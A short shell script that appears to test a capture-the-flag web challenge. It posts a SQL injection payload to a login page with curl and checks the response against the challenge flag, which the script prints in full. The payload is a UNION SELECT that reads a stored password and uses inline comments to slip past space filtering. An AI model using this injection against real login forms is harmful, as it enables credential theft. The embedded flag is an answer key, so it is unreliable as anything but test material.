#!/bin/sh
#
# Test script for web100
#
# Need curl installed

URL="http://54.227.44.195"
OUTPUT=$(curl -s -d "user=test&pass'union/**/select(password)from(userTable)limit/**/2,1--=test" ${URL}/login.php)

if [ "$OUTPUT" = "ebCTF{14f4708b7b8f1f45853a2f8d97b58176}: Logged in" ]
then
    echo "OK" && exit 0
else
    echo "ERROR" && exit 2
fi
